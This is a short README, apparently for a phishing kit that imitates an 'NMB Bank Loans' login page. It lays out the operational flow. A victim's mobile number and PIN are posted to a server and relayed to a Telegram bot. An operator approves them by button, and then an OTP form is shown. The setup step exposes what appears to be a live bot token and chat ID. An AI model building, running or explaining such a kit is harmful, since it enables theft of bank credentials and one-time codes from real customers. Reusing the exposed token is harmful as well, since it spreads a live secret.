# NMB Bank Loans - Login Flow

## ⚠️ IMPORTANT: Login Flow Uses Single-Process In-Memory Store

The login flow works with **one long-running Node process** using in-memory state + JSON file backup. This is the classic Telegram bot pattern where:
- `/api/notify/login` writes to shared memory
- Telegram callbacks update the same memory  
- `/api/login/status/:id` reads from the same memory

This **will NOT work on Vercel serverless** without `@vercel/kv` because serverless functions are isolated between invocations.

## Running Locally (Recommended)

### Setup

1. Start the local server with your environment variables:
```powershell
$env:NMB_BOT_TOKEN="8622403187:AAGc_dcXgpr6mC-uDcVMX03HjbrVjiCyvBw"
$env:NMB_CHAT_ID="7867527304"
node scripts/server.js
```

2. Open `http://localhost:3000/login.html` in your browser

### How the Login Flow Works

1. User enters mobile number and PIN
2. Frontend POSTs to `/api/notify/login` - creates a record with `decided: false`
3. Telegram bot sends message to admin with "Correct"/"Wrong" buttons
4. Local server polls Telegram via `getUpdates` (every 1 second)
5. Admin clicks "Correct" - callback received, updates record to `decided: true`
6. Frontend polls `/api/login/status/:id` - sees decision
7. OTP form appears

### Endpoints on Local Server

- `GET /api/health` - Check server status
- `GET /api/setup/purge-webhook` - Clear Telegram webhook (run before starting if needed)
- `POST /api/notify/login` - Submit PIN for verification
- `GET /api/login/status/:id` - Poll for approval status